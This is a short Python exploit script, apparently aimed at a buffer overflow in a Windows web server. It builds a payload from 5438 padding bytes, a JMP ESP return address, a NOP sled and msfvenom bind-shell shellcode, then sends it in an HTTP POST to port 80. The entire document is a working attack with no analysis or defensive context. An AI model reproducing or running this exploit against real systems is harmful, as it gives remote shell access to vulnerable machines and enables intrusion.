import socket

shellcode = ( # msfvenom windows/shell_bind_tcp -b '\x00\x09\x0a\x0b\x0c\x0d\x20'
"\xd9\xea\xba\x03\xc9\x19\xa6\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x56\x31\x50\x18\x83\xe8\xfc\x03\x50\x17\x2b\xec\x5a" +
"\xff\x22\x0f\xa3\xff\x54\x99\x46\xce\x46\xfd\x03\x62\x57" +
"\x75\x41\x8e\x1c\xdb\x72\x05\x50\xf4\x75\xae\xdf\x22\xbb" +
"\x2f\xee\xea\x17\xf3\x70\x97\x65\x27\x53\xa6\xa5\x3a\x92" +
"\xef\xd8\xb4\xc6\xb8\x97\x66\xf7\xcd\xea\xba\xf6\x01\x61" +
"\x82\x80\x24\xb6\x76\x3b\x26\xe7\x26\x30\x60\x1f\x4d\x1e" +
"\x51\x1e\x82\x7c\xad\x69\xaf\xb7\x45\x68\x79\x86\xa6\x5a" +
"\x45\x45\x99\x52\x48\x97\xdd\x55\xb2\xe2\x15\xa6\x4f\xf5" +
"\xed\xd4\x8b\x70\xf0\x7f\x58\x22\xd0\x7e\x8d\xb5\x93\x8d" +
"\x7a\xb1\xfc\x91\x7d\x16\x77\xad\xf6\x99\x58\x27\x4c\xbe" +
"\x7c\x63\x17\xdf\x25\xc9\xf6\xe0\x36\xb5\xa7\x44\x3c\x54" +
"\xbc\xff\x1f\x31\x71\x32\xa0\xc1\x1d\x45\xd3\xf3\x82\xfd" +
"\x7b\xb8\x4b\xd8\x7c\xbf\x66\x9c\x13\x3e\x88\xdd\x3a\x85" +
"\xdc\x8d\x54\x2c\x5c\x46\xa5\xd1\x89\xc9\xf5\x7d\x61\xaa" +
"\xa5\x3d\xd1\x42\xac\xb1\x0e\x72\xcf\x1b\x39\xb4\x01\x7f" +
"\x6a\x53\x60\x7f\x9d\xff\xed\x99\xf7\xef\xbb\x32\x6f\xd2" +
"\x9f\x8a\x08\x2d\xca\xa6\x81\xb9\x42\xa1\x15\xc5\x52\xe7" +
"\x36\x6a\xfa\x60\xcc\x60\x3f\x90\xd3\xac\x17\xdb\xec\x27" +
"\xed\xb5\xbf\xd6\xf2\x9f\x57\x7a\x60\x44\xa7\xf5\x99\xd3" +
"\xf0\x52\x6f\x2a\x94\x4e\xd6\x84\x8a\x92\x8e\xef\x0e\x49" +
"\x73\xf1\x8f\x1c\xcf\xd5\x9f\xd8\xd0\x51\xcb\xb4\x86\x0f" +
"\xa5\x72\x71\xfe\x1f\x2d\x2e\xa8\xf7\xa8\x1c\x6b\x81\xb4" +
"\x48\x1d\x6d\x04\x25\x58\x92\xa9\xa1\x6c\xeb\xd7\x51\x92" +
"\x26\x5c\x61\xd9\x6a\xf5\xea\x84\xff\x47\x77\x37\x2a\x8b" +
"\x8e\xb4\xde\x74\x75\xa4\xab\x71\x31\x62\x40\x08\x2a\x07" +
"\x66\xbf\x4b\x02" )

EIP = '\x53\x93\x42\x7E' # 7E429353 JMP ESP user.dll
payload = 'A'* 5438 + EIP + '\x90'*50 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
buf = "POST / %s HTTP/1.1\r\nHost:127.0.0.1\r\n\r\n" % (payload)

s.send(buf)
s.close()
